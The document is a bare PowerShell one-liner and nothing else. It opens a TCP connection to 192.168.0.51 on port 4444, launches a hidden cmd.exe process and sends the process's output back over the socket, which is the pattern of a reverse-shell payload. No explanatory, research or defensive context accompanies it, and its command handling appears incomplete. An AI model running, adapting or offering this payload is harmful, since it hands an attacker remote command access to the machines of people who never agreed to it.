$sm=(New-Object Net.Sockets.TCPClient("192.168.0.51", 4444)).GetStream();$sr=New-Object IO.StreamReader($sm);$sw=New-Object IO.StreamWriter($sm);$p=New-Object Diagnostics.Process;$p.StartInfo.FileName="cmd.exe";$p.StartInfo.RedirectStandardInput=$true;$p.StartInfo.RedirectStandardOutput=$true;$p.StartInfo.UseShellExecute=$false;$p.StartInfo.CreateNoWindow=$true;$p.Start();$cmdOut=$p.StandardOutput.ReadToEnd();$p.WaitForExit();$sw.WriteLine($cmdOut);$sm.Close()
